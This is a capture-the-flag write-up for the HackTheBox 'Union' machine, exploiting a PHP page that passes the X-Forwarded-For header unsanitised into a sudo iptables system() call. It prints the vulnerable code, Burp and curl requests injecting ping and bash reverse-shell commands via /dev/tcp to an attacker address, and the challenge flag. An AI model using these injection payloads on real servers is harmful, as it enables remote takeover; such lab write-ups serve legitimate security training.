# X-Forwarded-For Exploitation
*Union-machine Hackthebox*

This block of code is the insecure part:
```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```
It’s using `X-Forwarded-For (XFF)` to identify the originating IP of the client and **`system`** to call `sudo iptables`. While I’m sure the developer thought it was ok because the attacker cannot forge their remote address, what I can control is the `X-FORWARDED-FOR` header. Without sanitization of the user input this can be easily manipulated.
## Exploitation
### Burpsuite
Sending captured request over to Burp Repeater and add to that field `X-FORWARDED-FOR`:
```burpsuite
GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
Connection: close
Cookie: PHPSESSID=orpc54gjbbmaih8loabi2ru7bi
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.6;
```
For checking, with `tcpdump` listening, I’ll send the request. I get a ping:
```console
oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:28:32.771157 IP 10.10.11.128 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
16:28:32.771182 IP 10.10.14.6 > 10.10.11.128: ICMP echo reply, id 1, seq 1, length 64
```
Change the value of `X-FORWARDED-FOR` to create reverse shell:
```console
X-FORWARDED-FOR: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.16.6/8888 0>&1";
```
### curl
```console
#get PHPSESSID
curl -s -v http://10.10.11.128 -d "player=duy"

#After the user "duy" enters the flag value, he will have access to firewall.php, like authorizing access for the "duy" user. -L flag to tell curl to follow the redirect from the challenge.php page to the firewall.php page
curl -s -X POST -b 'PHPSESSID=tie6r4uno69o57gbuesapskfku' --data-binary 'flag=UHC{F1rst_5tep_2_Qualify}' 'http://10.10.11.128/challenge.php' -L 

#Reverse shell. After entering the flag and being authorized in the step above, the "duy" user has access to firewall.php
curl -X GET -H 'X-FORWARDED-FOR: ;bash -c "bash -i >& /dev/tcp/10.10.16.5/8888 0>&1";' --cookie "PHPSESSID=tie6r4uno69o57gbuesapskfku" 'http://10.10.11.128/firewall.php'
```
On the local machine, create listener with nc!
